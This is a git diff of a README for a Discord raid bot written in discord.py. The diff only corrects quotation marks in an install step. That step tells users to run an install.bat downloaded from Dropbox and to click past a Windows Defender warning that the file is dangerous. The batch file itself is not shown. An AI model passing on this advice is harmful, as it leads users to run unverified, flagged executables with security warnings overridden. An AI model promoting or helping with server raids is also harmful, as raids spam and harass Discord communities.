@@ -9,7 +9,7 @@ Just a bad made Discord bot for raids, built in [**discord.py**](https://discord
 Running the bot requires certain libraries that **must** be installed.
 
 1. Download and install [**Git**](https://git-scm.com/download/)
-2. Download and run [**install.bat**](https://www.dropbox.com/s/27fwhfi847khcas/install.bat?dl=1). It will automatically download the bot and install the libraries. Windows Defender will most probably flag the file as dangerous. Just click **More details > Run anyways"
+2. Download and run [**install.bat**](https://www.dropbox.com/s/27fwhfi847khcas/install.bat?dl=1). It will automatically download the bot and install the libraries. Windows Defender will most probably flag the file as dangerous. Just click "**More details > Run anyways**"
 
 ## 📌 Prefix
 
